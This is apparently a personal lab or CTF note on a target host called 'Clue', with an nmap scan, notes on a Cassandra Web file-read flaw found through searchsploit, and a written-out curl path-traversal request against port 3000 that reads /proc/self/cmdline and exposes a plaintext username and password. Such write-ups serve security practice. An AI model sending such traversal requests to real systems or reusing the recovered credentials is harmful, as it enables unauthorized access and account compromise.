
192.168.131.240

```sh
PORT     STATE SERVICE          VERSION
22/tcp   open  ssh              OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
|_  256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
80/tcp   open  http             Apache httpd 2.4.38
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: 403 Forbidden
139/tcp  open  netbios-ssn      Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn      Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3000/tcp open  http             Thin httpd
|_http-favicon: Unknown favicon MD5: 68089FD7828CD453456756FE6E7C4FD8
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: thin
|_http-title: Cassandra Web
8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
Service Info: Hosts: 127.0.0.1, CLUE; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-01-13T17:06:58
|_  start_date: N/A


```

found a rce but it mentioned an auth failed is it possible that password is wrong
![[Pasted image 20260113192049.png]]


- check smb

- noticed that there is port 3000 
- cassandra web 
- checking the searchsploit we found a LFI 

![[Pasted image 20260113200743.png]]


i tried to read `cassie , anthony` ssh i couldt find it 

LFI to read BINARY 
````sh
curl http://192.168.120.155:3000/../../../../../../../../proc/self/cmdline --path-as-is
````

```
/usr/bin/ruby2.5/usr/local/bin/cassandra-web-ucassie-pSecondBiteTheApple330
```
